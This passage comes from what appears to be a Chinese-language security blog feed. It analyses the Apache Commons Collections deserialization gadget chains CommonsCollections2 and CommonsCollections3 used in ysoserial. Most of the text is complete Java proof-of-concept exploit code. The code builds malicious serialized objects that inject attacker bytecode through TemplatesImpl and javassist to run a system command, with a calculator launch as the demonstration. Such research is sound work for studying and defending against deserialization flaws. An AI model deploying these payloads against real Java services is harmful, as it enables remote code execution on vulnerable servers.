Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ysoserial中的利用链"><a href="#ysoserial中的利用链" class="headerlink" title="ysoserial中的利用链"></a>ysoserial中的利用链</h2><p>在<code>ysoserial</code>中的利用链则和前面我们所构造的有所不同，gadget 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>与我们前面构造的 POC 不同的是，<code>ysoserial</code>后面采用了<code>TemplatesImpl</code>类，我们跟进<code>TemplatesImpl#newTransformer()</code>方法<br><img src="images/image-20221010113159001.png" alt="image-20221010113159001"></p><p>该方法中调用了<code>getTransletInstance()</code>，继续跟进<code>getTransletInstance()</code>源码<br><img src="images/image-20221010113437251.png" alt="image-20221010113437251"></p><p>上面可以看到当<code>this._class</code>为<code>null</code>时就会调用<code>defineTransletClasses()</code>方法，因为<code>this._class</code>为<code>TemplatesImpl</code>类的属性，所以是可以通过反射控制的。</p><p>继续跟进<code>defineTransletClasses()</code>方法<br><img src="images/image-20221010113526585.png" alt="image-20221010113526585"></p><p>这里通过<code>load.defineClass()</code>方法将字节码进行加载定义一个新的类，而<code>this._bytecodes</code>也是类的属性，所以也是可以通过反射进行控制字节码。此外，接下来的<code>superClass.getName().equals(ABSTRACT_TRANSLET)</code>判断新定义的类是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，只有继承才会将下标<code>i</code>赋值给<code>this._transletIndex</code>。</p><p>最后再通过<code>newInstance()</code>方法实例化新定义的类<br><img src="images/image-20221010114142369.png" alt="image-20221010114142369"></p><p>构造 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造InvokerTransformer</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射修改queue</span></span><br><span class="line">        Object[] objectsArrary = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,objectsArrary);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221010161316401.png" alt="image-20221010161316401"></p><p><strong>这里为什么需要再通过一次反射修改 queue ？</strong> </p><p>可以往回到<code>compara()</code>方法，因为我们这次使用的是<code>InvokerTransformer</code>，其中的<code>transform()</code>参数<code>obj1</code>需要设置为<code>TemplatesImpl</code>类，去触发<code>TemplatesImpl#newTransformer()</code><br><img src="images/image-20221010162150110.png" alt="image-20221010162150110"></p><p>那为什么不在第一个<code>priorityQueue.add(1)</code>时加入呢？因为在后面会有一个数组间的元素比较，而对象和数字，以及对象和对象是无法比较的。</p><p>接下来回答一下开头说的为什么<code>javassist</code>是个伪条件，跟下来其实发现<code>javassist</code>的作用就是构造一个恶意类，最后这个恶意类被转换成了字节码。而我们可以本地构造好恶意类的字节码，直接设置到<code>_bytecodes</code>，无需在目标主机上去通过<code>javassist</code>构造。</p>]]></content>
    
    
    <summary type="html">CommonsCollections2利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections3利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections3/"/>
    <id>http://example.com/2022/11/10/CommonsCollections3/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:53:44.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链分析"><a href="#CommonsCollections3利用链分析" class="headerlink" title="CommonsCollections3利用链分析"></a>CommonsCollections3利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections3</code>利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">jdk 8u71 版本之前</span><br></pre></td></tr></table></figure><p>先看利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         <span class="title function_">newInstance</span><span class="params">()</span></span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>看到这个利用链，前半部分是<code>CommonsCollections1</code>的内容，而后半部分则是<code>CommonsCollection2</code>的内容，不过与<code>CommonsCollections2</code>不同的是，不再利用<code>invokerTransformer</code>类，而是使用<code>InstantiateTransformer</code>类。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>翻一下<code>ysoserial</code>中的源码<br><img src="images/image-20221010171824472.png" alt="image-20221010171824472"></p><p>可以看见这次<code>transformers</code>由<code>ConstantTransformer</code>和<code>InstantiateTransformer</code>组成，其中<code>ConstantTransformer</code>传入的类为<code>TrAXFilter</code>，先跟进该类看看源码<br><img src="images/image-20221010173113393.png" alt="image-20221010173113393"></p><p>发现该类会调用<code>newTransformer()</code>方法，接着继续跟进看<code>InstantiateTransformer()</code><br><img src="images/image-20221010174156050.png" alt="image-20221010174156050"></p><p>在<code>InstantiateTransformer#transform()</code>方法中，通过<code>getConstructor()</code>方法进行实例化，而这里的<code>input</code>则是前面构造的<code>TrAXFilter</code>类，因此可以触发<code>TransformerImpl#newTransformer()</code>方法加载构造的恶意字节码进而命令执行。</p><p>在给出的利用链中可以看到触发<code>xxx.transform()</code>方法用的是前面<code>CommonsCollections1</code>中的<code>LazyMap.get()</code>方法，因此可以编写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections3</span> <span class="variable">commonsCollections3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections3</span>();</span><br><span class="line">        commonsCollections3.serialize();</span><br><span class="line">        commonsCollections3.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置方法访问权限</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">     